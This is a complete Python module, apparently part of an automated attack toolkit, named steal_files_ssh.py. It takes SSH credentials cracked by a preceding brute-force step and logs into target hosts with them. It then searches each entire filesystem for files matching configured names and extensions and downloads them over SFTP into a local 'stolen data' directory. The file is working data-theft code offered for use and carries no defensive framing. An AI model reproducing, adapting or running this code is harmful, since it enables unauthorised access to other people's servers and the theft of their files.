"""
steal_files_ssh.py - This script connects to remote SSH servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import paramiko
import logging
import time
from rich.console import Console
from threading import Timer
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesSSH"
b_module = "steal_files_ssh"
b_status = "steal_files_ssh"
b_parent = "SSHBruteforce"
b_port = 22

class StealFilesSSH:
    """
    Class to handle the process of stealing files from SSH servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.sftp_connected = False
            self.stop_execution = False
            logger.info("StealFilesSSH initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ssh(self, ip, username, password):
        """
        Establish an SSH connection.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password)
            logger.info(f"Connected to {ip} via SSH with username {username}")
            return ssh
        except Exception as e:
            logger.error(f"Error connecting to SSH on {ip} with username {username}: {e}")
            raise

    def find_files(self, ssh, dir_path):
        """
        Find files in the remote directory based on the configuration criteria.
        """
        try:
            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f')
            files = stdout.read().decode().splitlines()
            matching_files = []
            for file in files:
                if self.shared_data.orchestrator_should_exit :
                    logger.info("File search interrupted.")
                    return []
                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                   any(file_name in file for file_name in self.shared_data.steal_file_names):
                    matching_files.append(file)
            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            raise

    def steal_file(self, ssh, remote_file, local_dir):
        """
        Download a file from the remote server to the local directory.
        """
        try:
            sftp = ssh.open_sftp()
            self.sftp_connected = True  # Mark SFTP as connected
            remote_dir = os.path.dirname(remote_file)
            local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
            os.makedirs(local_file_dir, exist_ok=True)
            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
            sftp.get(remote_file, local_file_path)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
            sftp.close()
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")
            raise

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the remote server using SSH.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesSSH"
                # Wait a bit because it's too fast to see the status change
                time.sleep(5)
                logger.info(f"Stealing files from {ip}:{port}...")

                # Get SSH credentials from the cracked passwords file
                sshfile = self.shared_data.sshfile
                credentials = []
                if os.path.exists(sshfile):
                    with open(sshfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                if not credentials:
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    """
                    Timeout function to stop the execution if no SFTP connection is established.
                    """
                    if not self.sftp_connected:
                        logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.start()

                # Attempt to steal files using each credential
                success = False
                for username, password in credentials:
                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
                        logger.info("File search interrupted.")
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        ssh = self.connect_ssh(ip, username, password)
                        remote_files = self.find_files(ssh, '/')
                        mac = row['MAC Address']
                        local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
                        if remote_files:
                            for remote_file in remote_files:
                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                    logger.info("File search interrupted.")
                                    break
                                self.steal_file(ssh, remote_file, local_dir)
                            success = True
                            countfiles = len(remote_files)
                            logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
                        ssh.close()
                        if success:
                            timer.cancel()  # Cancel the timer if the operation is successful
                            return 'success'  # Return success if the operation is successful
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
            else:
                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
                return 'failed'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ssh = StealFilesSSH(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
